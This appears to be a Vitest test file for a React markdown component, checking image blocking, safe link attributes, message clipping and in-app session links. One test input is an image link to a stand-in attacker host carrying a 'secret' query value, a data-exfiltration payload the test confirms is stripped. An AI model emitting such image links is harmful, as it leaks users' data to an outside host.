import { expect, test } from 'vitest'
import { renderToString } from 'react-dom/server'
import Md, { clip, MAX_CHARS } from './Md'

test('markdown never loads remote images and opens links in a new tab', () => {
  const html = renderToString(<Md text={'![x](https://evil.example/?q=secret) [doc](https://ok.example)'} />)
  expect(html).not.toContain('<img')
  expect(html).not.toContain('evil.example')
  expect(html).toContain('target="_blank"')
  expect(html).toContain('rel="noopener noreferrer"')
})

test('clip truncates very long messages', () => {
  expect(clip('short')).toEqual(['short', false])
  const [t, cut] = clip('a'.repeat(MAX_CHARS + 10))
  expect(t.length).toBe(MAX_CHARS)
  expect(cut).toBe(true)
})

test('#s: links render as in-app session buttons, not navigation', () => {
  const html = renderToString(<Md text="[Fix login](#s:abc-123)" onSession={() => {}} />)
  expect(html).toContain('<button')
  expect(html).toContain('Fix login')
  expect(html).not.toContain('href="#s:abc-123"')
})
